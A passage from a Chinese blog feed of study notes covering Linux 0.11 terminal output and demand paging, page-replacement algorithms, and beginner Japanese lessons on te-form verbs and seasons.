buf, <span class="keyword">int</span> count)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rw_ttyx</span><span class="params">(<span class="keyword">int</span> rw, <span class="keyword">unsigned</span> minor, <span class="keyword">char</span>* buf, <span class="keyword">int</span> count)</span><span class="comment">//此时rw==WRITE</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span>((rw==READ) ? tty_read(minor, buf):tty_write(minor, buf));<span class="comment">//写入缓冲</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析tty_write//实现输出的核心</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在1inux/kernel/tty_io.c中</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tty_write</span><span class="params">(<span class="keyword">unsigned</span> channel,<span class="keyword">char</span>*buf,<span class="keyword">int</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>*<span class="title">tty</span>;</span></span><br><span class="line">    tty=channel+tty_table;</span><br><span class="line">    sleep_if_full(&amp;tty-&gt;write_q); <span class="comment">//可以猜测:输出就是放入队列,满了的话就sleep</span></span><br><span class="line">    </span><br><span class="line">...</span><br><span class="line"><span class="keyword">char</span> c,*b=buf;<span class="comment">//buf在用户态内存,</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(nr&gt;<span class="number">0</span>&amp;&amp;!FULL(tty-&gt;write_q))&#123;</span><br><span class="line">        c = get_fs_byte(b);<span class="comment">//fs从缓冲区读取</span></span><br><span class="line">        <span class="keyword">if</span>(c==<span class="string">'\r'</span>)&#123;</span><br><span class="line">            PUTCH(<span class="number">13</span>,tty-&gt;write_q);<span class="comment">//放入队列中输出</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(O_LCUC(tty))</span><br><span class="line">            c = <span class="built_in">toupper</span>(c);</span><br><span class="line">        b++;</span><br><span class="line">        nr--;</span><br><span class="line">        PUTCH(c,tty-&gt;tty_write_q);</span><br><span class="line">    &#125;<span class="comment">//输出完事或写队列满</span></span><br><span class="line">    </span><br><span class="line">    tty-&gt;write(tty);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tty-gt-write-tty-真的开始输出屏幕了"><a href="#tty-gt-write-tty-真的开始输出屏幕了" class="headerlink" title="tty-&gt;write(tty)真的开始输出屏幕了."></a><code>tty-&gt;write(tty)</code>真的开始输出屏幕了.</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在include/linux/tty.h中</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span>(*write)(struct tty struct*tty);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty</span> _<span class="title">queue</span> <span class="title">read_q</span>,<span class="title">write_g</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tty中的write函数,再看看tty_struct的初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> <span class="title">tty_table</span>[] = &#123;</span></span><br><span class="line">   &#123;con_write,&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">""</span>&#125;,&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">""</span>&#125;&#125;,&#123;&#125;,...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在看(consle)con_write实施细节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在1inux/kerne1/chr drv/console.c中</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">con_write</span><span class="params">(struct tty_struct*tty)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GETCH(tty-&gt;write_q,c);</span><br><span class="line"><span class="keyword">if</span>(c&gt;<span class="number">31</span>&amp;&amp;c&lt;<span class="number">127</span>)&#123;</span><br><span class="line">__asm__(<span class="string">"movb _attr,%%ah\n\t"</span>  <span class="comment">//_attr是属性赋值给ah</span></span><br><span class="line">           </span><br><span class="line"><span class="string">"movw %%ax,%1\n\t"</span>::<span class="string">"a"</span>(c),<span class="comment">//字符c赋值给ax的al.ax赋值给%1(pos)\</span></span><br><span class="line">            </span><br><span class="line"><span class="string">"m"</span>(*(<span class="keyword">short</span>*)pos):<span class="string">"ax"</span>);<span class="comment">//pos就是显卡的控制器,ax字符放到显存上. </span></span><br><span class="line">        </span><br><span class="line">     pos+=<span class="number">2</span>;<span class="comment">//写完显存后移,一个字符大小有16位(字符+字符属性).</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从write队列中获取数据,然后使用汇编代码.</p><p><strong>组原中讲过,如果是独立编制的控制器使用<code>out</code>指令,而控制器与内存统一编制时使用<code>mov</code>指令.</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从wirte开始,用到open获取到设备file,再根据file中的inode通过函数表获取到所需要的注册函数,再out出去.</p><p>这就是设备驱动.(</p><p>写设备驱动</p><ol><li>写入核心out指令</li><li>相应的函数注册到表中</li><li>再创建个dev下的文件,与表中函数对应</li></ol><h3 id="mov-pos解析"><a href="#mov-pos解析" class="headerlink" title="mov pos解析"></a><code>mov pos</code>解析</h3><p><img src="https://i.loli.net/2018/12/30/5c28ba6af1b36.jpg" alt></p><p>gotoxy()根据x,y的值和宏定义得到pos的值</p><p><code>0x90000</code>系统启动时,在setup时取出硬件的参数,将光标的位置(显存的位置)放到该地址处.改地址就是pos位置</p><p><img src="https://i.loli.net/2018/12/30/5c28bca8e245e.jpg" alt></p><p><code>mov pos,c</code></p><p><code>out pos,c</code></p><p>再包装成函数,文件</p><ul><li>用到了缓冲技术</li><li>同步机制</li></ul><p>核心就是cpu向控制器发出指令</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="操作系统" scheme="http://xwdidi.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://xwdidi.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="驱动" scheme="http://xwdidi.top/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="I/O" scheme="http://xwdidi.top/tags/I-O/"/>
    
  </entry>
  
  <entry>
    <title>誘い   第十一课</title>
    <link href="http://xwdidi.top/2018/12/18/2018-12-18-%E6%97%A5%E8%AF%AD%E5%8D%81%E4%B8%80%E8%AF%BE%E3%83%BC%E8%AA%98%E3%81%84/"/>
    <id>http://xwdidi.top/2018/12/18/2018-12-18-日语十一课ー誘い/</id>
    <published>2018-12-17T16:00:00.000Z</published>
    <updated>2019-04-06T13:55:00.385Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>実は<br>では　失礼します<br>ちょっと    表示省略</p><p>いいですか　か 疑问　<br>いいですよ    　よ 引起注意<br>ううですれ    　れ 表示确定<br>いいです<br><img src="https:\/\/i.loli.net\/2018\/12\/10\/5c0e77c7e6fd2.png" alt></p><p>みせます<br>あらいます<br>教えます　おしえます<br>またれ～</p><p>表达语句:</p><p>道を教えます</p><h3 id="て形"><a href="#て形" class="headerlink" title="て形"></a>て形</h3><p>一类动词:</p><p>話します　はなして</p><p>探します　さがして</p><p>だします　だして</p><p>します　－＞　して</p><p>書きます　かいて</p><p>聞きます　きいて</p><p>あるきます　歩いて</p><p>開きます　開いて</p><p>泳ぎます　泳いて</p><p>ます　－＞いて</p><p>ぎますー＞いで</p><p>買います　買って</p><p>まちます　まって　</p><p>かえります　帰って</p><p>あります　あって</p><p>います　ちます　ります　ー＞　って</p><p>死にます　しんで</p><p>読みます　よんで</p><p>呼びます　読んで</p><p>にます　みます　びます　－＞って</p><p>二类动词：</p><p>起（o ki）きます　起きて</p><p>寝(n e )ます　寝て</p><p>見(m i)ます　みて</p><p>食べ(ta be)ます　食べて</p><p>i ます</p><p>e ます</p><p>三类动词:</p><p>します　して</p><p>来ます　きて</p><p>アルバイトします　アルバイトして</p><p>勉強します　勉強して</p><p>-ますー＞　て</p><p><img src="https:\/\/i.loli.net\/2018\/12\/16\/5c165e3a107e1.jpg" alt></p><p>用语:</p><p>見てください</p><p>聞いてください</p><p>書いてください</p><p>読んでください</p><p>言ってください</p><p>練習をしてください</p><p>形容词修饰动词表示动作的状态</p><p>早く行きます</p><p>安く売ります</p><p>早くれます</p><p>邀请</p><p>Vませんか｜　Vましょう</p><p>コーヒーを飲みませんか</p><p>映画をみませんか</p><p>音楽を聞きませんか　</p><p>観光名所　</p><p>紅葉（もみじ)をみました</p><p>「まず外（そと）で体（からだ）を洗（あら）って、それからお湯の中に入り（はいり）ます」</p><p>常用表达:</p><ul><li><p>A:こーひでも（助词,语气委婉）飲みに行きませんか</p><p>B：いいですね</p><p>本でも読みましょう</p></li><li><p>A:お茶でもにもに行きませんか</p><p>B：いいですね</p></li><li><p>ドライブはご一緒にどうですか</p></li></ul><p>　　食事はご一緒にどうですか</p><p>都合　情况</p><p>温泉　おんせん</p><p>かんこう　観光</p><p>電話　でんわ</p><p>病気　びょうき</p><p>大丈夫　だいじょうぶ</p><p>もみじ　紅葉</p><p>名所　めいしょ</p><p>何時　なんじ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="日语" scheme="http://xwdidi.top/categories/%E6%97%A5%E8%AF%AD/"/>
    
    
      <category term="日语" scheme="http://xwdidi.top/tags/%E6%97%A5%E8%AF%AD/"/>
    
      <category term="日本" scheme="http://xwdidi.top/tags/%E6%97%A5%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>内存管理    L25 内存换出 Swapout</title>
    <link href="http://xwdidi.top/2018/12/04/2018-12-04-L25%E5%86%85%E5%AD%98%E6%8D%A2%E5%87%BA/"/>
    <id>http://xwdidi.top/2018/12/04/2018-12-04-L25内存换出/</id>
    <published>2018-12-03T16:00:00.000Z</published>
    <updated>2019-05-24T15:02:02.673Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>换入换出是合在一起进行的.</p><p>换入的目的,实现虚拟内存. 有换入就必须有换出,只有换出空出的新的空闲区域,才能放入新的数据.</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要讲算法.</p><blockquote><p>有换入就应该有换出</p></blockquote><p><code>page = get_free_page();</code></p><p><code>bread_page(page,current-&gt;excutable-&gt;i_dev,nr)</code></p><p>并不能粽是获得新的页,内存也是有限的</p><ul><li><h3 id="需要选择一页淘汰-换出到磁盘-选择哪一页-尝试"><a href="#需要选择一页淘汰-换出到磁盘-选择哪一页-尝试" class="headerlink" title="需要选择一页淘汰,换出到磁盘,选择哪一页?尝试"></a>需要选择一页淘汰,换出到磁盘,选择哪一页?尝试</h3></li></ul><h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><h4 id="1-FIFO"><a href="#1-FIFO" class="headerlink" title="1. FIFO"></a>1. FIFO</h4><p>FIFO(先入先出)页面置换.</p><p>实例介绍:分配了3个页框</p><p>每个页换入换出都不合时宜,太过于机械,大多数时间都浪费在I/O中.</p><p>缺页次数应该少.判断使用次数,最少的换出去.</p><p><img src="https://i.loli.net/2018/12/04/5c0688cbad61e.jpg" alt></p><p>产生七次缺页</p><h4 id="2-MIN算法："><a href="#2-MIN算法：" class="headerlink" title="2. MIN算法："></a>2. MIN算法：</h4><p>选最远将使用的页淘汰，是最优方案</p><p><img src="https://i.loli.net/2018/12/04/5c06867d65d76.jpg" alt></p><p>五次换页,</p><p>MIN需要知道将来发生的事…怎么办.</p><h3 id="3-LRU"><a href="#3-LRU" class="headerlink" title="3. LRU"></a>3. LRU</h3><p>least recent use 最近最少使用</p><p>用过去的历史预测将来/</p><p>选取最近最长一段时间没有使用的页淘汰(最近最少使用的页)</p><p>程序具有局部性的特点,这样算法会有较大的适应性</p><p> <img src="https://i.loli.net/2018/12/05/5c0795020db27.png" alt="1544000727828"></p><p>### </p><h3 id="1-LRU的准确实现-使用时间戳"><a href="#1-LRU的准确实现-使用时间戳" class="headerlink" title="1. LRU的准确实现,使用时间戳"></a>1. LRU的准确实现,使用时间戳</h3><p>通过对使用的页,每次使用时,增加时间戳.时间戳上显示使用该页的最后时间 .</p><p>若要进行换页选择时间戳最小的页换出.</p><p>根据查出来的逻辑页,需要去维护时间戳.每执行一条指令(取址执行),修改每个页的时间戳.同时要处理.时间戳存在溢出的危险,</p><p><img src="https://i.loli.net/2018/12/05/5c079b48f15a3.jpg" alt></p><blockquote><p>每次地址访问都需要修改时间戳，需维护一个全局时钟，需找到最小值..实现代价较大</p></blockquote><h3 id="2-若采用页码查找"><a href="#2-若采用页码查找" class="headerlink" title="2. 若采用页码查找"></a>2. 若采用页码查找</h3><p>在栈的顶部总是保留最近使用的页.</p><p>换页时,选择栈底页淘汰. </p><p><img src="https://i.loli.net/2018/12/05/5c079d2a0d887.jpg" alt></p><h3 id="3-LRU近似实现-将时间计数变为是和否"><a href="#3-LRU近似实现-将时间计数变为是和否" class="headerlink" title="3. LRU近似实现-将时间计数变为是和否"></a>3. LRU近似实现-将时间计数变为是和否</h3><p>不做时间戳,进计数,</p><ul><li><p>在每个页加一个引用位,访问过这一页这个数置为1</p></li><li><p>二次机会算法.Clock Algorithm</p><p><img src="https://i.loli.net/2018/12/05/5c07a570759d5.jpg" alt></p><p>进行扫描,访问过的位的数若为1,则置为0,不淘汰.</p><p>如果遇到0时,则被淘汰.  </p><p>1代表最近访问过, 而如果之前再次扫描到被置为0的那个页,则代表了在扫描的时间内没有被访问,则被替换出去.</p><p>为什么说是近似实现呢,最近没有使用是最近最少使用的近似.</p><p>只需要修改一个数,能减少操作数.因为要查页表,MMU直接自动的把R置成1，R可以直接放到页表项中，MMU自动做，不用去维护复杂的数据结构。</p></li></ul><h4 id="Clock算法的分析与改造"><a href="#Clock算法的分析与改造" class="headerlink" title="Clock算法的分析与改造"></a>Clock算法的分析与改造</h4><p>效率高，代价小。</p><p>然而: 如果缺页很少，会</p><p>导致很少从1置为0,会被一直访问,R全为1.如果全为1,扫描后全变为0,一圈后则会将初始的那页换出去,指针指向下一个.下一个与前面的过程相同,然后被换出.算法就变为了按顺序换出,不就是FIFO吗?</p><p>R记录了太长的历史信息,退化为FIFO.所以我们定时清除R位.再来个扫描指针</p><p><img src="https://i.loli.net/2018/12/05/5c07ac294d762.jpg" alt></p><p>缺页导致指针转的太慢,用扫描指针清零.被清零后又没被使用,仍然为0,则他会被调出.</p><h4 id="那么该给进程分配多少页框呢-物理内存"><a href="#那么该给进程分配多少页框呢-物理内存" class="headerlink" title="那么该给进程分配多少页框呢(物理内存)"></a>那么该给进程分配多少页框呢(物理内存)</h4><ul><li><p>分配过多,请求调页导致的内存高效就没了.</p></li><li><p>分配太少呢?<img src="https://i.loli.net/2018/12/05/5c07ad64b5d0f.jpg" alt></p><p>这一现象被称为颠簸.</p><p>原因解释：</p><p><strong>系统内进程增多&gt;每个进程的缺页率增大&gt;缺页率增大到一定程度，进程总等待调页完成&gt;</strong><br><strong>CPU利用率降低&gt;进程进一步增多，缺页率更大…</strong></p></li></ul><p>所以分配的局部,需要覆盖一个局部(通过某种算法求得的”工作集”),也可以通过动态调整页框数量,减少颠簸.</p><p>如果进程太多,无法囊括全部.需要限制进程数量,涉及CPU管理,进程管理.</p><p>clock环形数组+clock算法.</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>换入缺页,从磁盘读入一个页,可能没有足够的页大小,则使用clock算法换出一个页,再将页换入.这就是swap分区管理.</p><p>内存,时钟中断,磁盘管理,磁盘驱动.实现了换入换出的模型.又是为了实现虚拟内存,又是为了实现段页管理,又实现操作系统内存管理,又是为了实现程序的正常加载,又实现了进程.</p><p>形成了以进程带动的多进程推进,内存有效管理的图.初始化,系统接口,设备驱动,文件系统实现了基本简单完整的操作系统.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="操作系统" scheme="http://xwdidi.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://xwdidi.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="汇编" scheme="http://xwdidi.top/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="内存" scheme="http://xwdidi.top/tags/%E5%86%85%E5%AD%98/"/>
    
  </entry>
  
  <entry>
    <title>季節と天気   第十课</title>
    <link href="http://xwdidi.top/2018/12/03/2018-12-03-%E6%97%A5%E8%AF%AD%E7%AC%AC%E5%8D%81%E8%AF%BE/"/>
    <id>http://xwdidi.top/2018/12/03/2018-12-03-日语第十课/</id>
    <published>2018-12-02T16:00:00.000Z</published>
    <updated>2019-04-06T13:54:22.903Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>きせつ　季節</p><p>しき    四季</p><p>春　はる　　</p><p>夏    なつ</p><p>秋    あき</p><p>冬    ふゆ</p><p>天気　てんき</p><p>あたたかい　暖かい</p><p>あつい　あつい</p><p>闷热     蒸し暑い　むしあつい</p><p>涼しい　すずしい</p><p>さむい　寒い</p><p>あめ　雨</p><p>雨が降ります</p><p>ゆき</p><p>雪が降ります</p><p>風</p><p>風が吹きます</p><p>さくらが咲きます</p><p>花見をします　赏花</p><p>海　うみ</p><p>すいえい　水泳</p><p>私は海が好きです</p><p>花火　はなび</p><p>紅葉をみます</p><p>スキー　滑雪</p><p>スキー場　すきーじょう</p><p>四季がはっきりあります　　</p><p>はっきり　 清楚</p><p>梅雨　つゆ</p><p>台風　たいふう</p><p>洪水　こうずい</p><p>地震　じしん</p><p>津波　つなみ　海啸</p><p>私は日本</p><p>羨ましなあ</p><p>いや　</p><p>梅雨は嫌です</p><p>楽しい　たのしい</p><p>じゅう　</p><p>一年中　いちねんじゅう</p><p>日本中　にほんじゅう</p><p>今日中　きょじゅう</p><p>島国　しまぐに</p><p>北海道　ほっかいどう</p><p>札幌　さっぽろ</p><p>仙台　せんだい</p><p>東京　とうきょう</p><p>名古屋　なごや</p><p>京都　きょうと</p><p>おおさか　大阪</p><p>神戸　こうべ</p><p>広島　ひろしま</p><p>四国　しこく</p><p>きゅうしゅう　九州</p><p>福岡　ふくおか</p><p>沖縄　おきなわ</p><p>Aかったです　い变为かった</p><p>寒い　寒かった　寒かったです</p><p>可愛い　可愛かった　可愛かったです</p><p>いい    よかった</p><p>昨日は暖かったです　　　　　<br>昨日は暑かったです。　　<br>昨日はさむかったです、きょうはさむくないです</p><p>Aくなかったです　否定</p><p>寒くないです</p><p>寒くなかったです　过去否定</p><p>寒くありません</p><p>寒くありませんでした</p><p>昔　以前</p><p>昨日は寒かったです、今日も寒いです。</p><p>二类形容词</p><p>ANでした/ANではありませんでした</p><p>李さんはコーヒーがきらいでした</p><p>静か　ふべん　きれい</p><p>前のアパートは静かでした。ふべんでした。きれいではありませんでした</p><p>形容词表示变化</p><p>Aく／ANに　＋　なります</p><p>１．　～くなります    寒くなります    今日は暖かくなりました。</p><p>２．　けれいになりました</p><p>形容词并列</p><p>Aくて／ANで</p><p>～～Aくて</p><p>１．</p><p>安くて美味しいです</p><p>ひるは暑くて、よるは寒いです</p><p>２．</p><p>このアパートは静かで便利です</p><p>図書館はしずかで、公園はにぎやかです</p><p>修饰名词</p><p>AいN／ANなN</p><p>広い部屋</p><p>面白い映画を見ました</p><p>美味しい日本料理をたべました。</p><p>静かな町</p><p>有名な大学</p><p>綺麗な桜をみました</p><p><img src="https://i.loli.net/2018/12/03/5c052db339238.png" alt></p><p>今度　こんど</p><p>うらやましいなあ</p><p>裏日本</p><p>表日本</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="日语" scheme="http://xwdidi.top/categories/%E6%97%A5%E8%AF%AD/"/>
    
    
      <category term="日语" scheme="http://xwdidi.top/tags/%E6%97%A5%E8%AF%AD/"/>
    
      <category term="日本" scheme="http://xwdidi.top/tags/%E6%97%A5%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>内存管理    L24 内存换入-请求调页</title>
    <link href="http://xwdidi.top/2018/11/27/2018-11-27-L24%E5%86%85%E5%AD%98%E6%8D%A2%E5%85%A5-%E8%AF%B7%E6%B1%82%E8%B0%83%E9%A1%B5/"/>
    <id>http://xwdidi.top/2018/11/27/2018-11-27-L24内存换入-请求调页/</id>
    <published>2018-11-26T16:00:00.000Z</published>
    <updated>2019-04-06T13:54:13.166Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="回顾与引导"><a href="#回顾与引导" class="headerlink" title="回顾与引导"></a>回顾与引导</h2><p>内存换出是从虚拟内存中引申出来的.</p><p>为什么需要虚拟内存呢,实现段页式,用虚拟内存进行分段,将虚拟内存分成一页一页的映射到物理内存中.</p><p>虚拟内存是连接分页分段的核心所在,分段分页管理内存的重要机制,换入换出是实现虚拟内存的关键.</p><p>分段,让用户使用.分页,提高内存效率.虚拟内存做中介.</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>基于虚拟内存的分段分页.换入换出机制实现虚拟内存. </p><p>段页同时存在时就拥有虚拟内存,用户程序只看到了0-4g的虚拟内存地址.割出内存存放,然后完成映射.</p><p>用户可以随意的使用这4个g的虚拟内存,就像拥有4g内存.用户程序是不知道如何映射的.</p><h4 id="用换入-换出实现”大内存”"><a href="#用换入-换出实现”大内存”" class="headerlink" title="用换入,换出实现”大内存”"></a>用换入,换出实现”大内存”</h4><p>4g虚拟内存是可能无法全部装入物理内存中的.</p><p>例:虚拟内存4g,物理内存1g.<br>换入换出,只有需要使用的内存地址,才进入物理内存中,其他数据暂时存储在物理磁盘上.等需要使用时再进行交换.</p><p>虚拟内存相当于仓库,物理内存相当于店面,从仓库拿出所需物品放到柜台上.(大概这个意思吧</p><p><strong>请求的时候才做映射</strong></p><h4 id="请求调页"><a href="#请求调页" class="headerlink" title="请求调页"></a>请求调页</h4><p>请求调入页面-&gt;建立映射.</p><ul><li>逻辑地址中的0-4g随意的虚拟地址,  然后访问段表得到虚拟内存地址.当虚拟地址真正的去映射的时候, 如果不存在映射的话(缺页),需要请求进行调页.</li></ul><p>执行地址,MMU发现<strong>缺页</strong>的时候,会发生中断.进行页错误处处理程序. 通过相关算法,找到磁盘中所需的页,并在空闲内存(<code>get_free_page()</code>)处进行映射. (换页)然后在执行中断前的指令.相当于对用户透明.</p><p>图一:<img src="https://i.loli.net/2018/11/28/5bfe8f718ebb8.jpg" alt></p><p>Q:采用请求调页不采用请求调段的原因是什么呢.</p><p>​    大概 (请求调页的粒度更细，更能提高内存效率)</p><p> 实现了虚拟内存的概念,</p><h3 id="实际的请求调页"><a href="#实际的请求调页" class="headerlink" title="实际的请求调页"></a>实际的请求调页</h3><ol><li><p>从哪里开始呢?</p><p>(1)是MMU硬件所做的,我们可以在缺页的中断开始.</p><p><img src="https://i.loli.net/2018/11/28/5bfe9181cf1b0.jpg" alt></p><p>设置好中断后怎么处理.</p><p>一下时处理程序的详细解析.</p><ol><li><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trap_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;set_trap_gate(<span class="number">14</span>,spage_fault);&#125;<span class="comment">//设置14号中断</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_trap_gate(n,addr)\</span></span><br><span class="line">_set_gate(&amp;idt[n],<span class="number">15</span>,<span class="number">0</span>,addr);</span><br></pre></td></tr></table></figure></li><li><p>处理中断page fault</p><p><img src="https://i.loli.net/2018/11/28/5bfe92454bd29.jpg" alt></p><p>上面是内核代码段,错误信息的线性地址(虚拟地址)在cr2中,并复制给edx.</p><p>并且压栈,调用相关处理函数. </p><p><img src="https://i.loli.net/2018/11/28/5bfe937cd0f69.jpg" alt></p></li><li><p>do_no_page(解析</p><p>调页具体操作.读磁盘,申请空闲内存,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在1inux/mm/memory.c中</span></span><br><span class="line">void do_no_page()unsigned long error_code,unsigned long address)</span><br><span class="line">&#123;</span><br><span class="line">address&amp;=<span class="number">0xfffff000</span>;<span class="comment">//页面地址,得到偏移地址</span></span><br><span class="line">    </span><br><span class="line">tmp=address-current-&gt;start code;<span class="comment">//页面对应的偏移</span></span><br><span class="line"><span class="keyword">if</span>(!current-&gt;executablel||tmp&gt;=current-&gt;end_data)&#123;<span class="comment">//不是代码和数据</span></span><br><span class="line">        </span><br><span class="line">get_empty_page()address);<span class="keyword">return</span>;&#125;</span><br><span class="line">page=get_free_page());<span class="comment">//获得空闲内存</span></span><br><span class="line">    </span><br><span class="line">bread_page(page,current-&gt;executable-&gt;i_dev,np);<span class="comment">// (blockread)磁盘读写,从这个设备中读写.</span></span><br><span class="line">    </span><br><span class="line">put_page(page,address);<span class="comment">//建立映射</span></span><br></pre></td></tr></table></figure><ul><li>中断</li><li>申请空闲页</li><li>读入需要页</li><li>建立映射</li><li>中断返回执行中断前的地址.</li></ul><p><img src="https://i.loli.net/2018/11/28/5bfe984d393c6.jpg" alt></p><ol start="4"><li>put_page解析</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在1inux/mm/memory.c中</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="number">1</span><span class="function">ong put <span class="title">page</span><span class="params">(<span 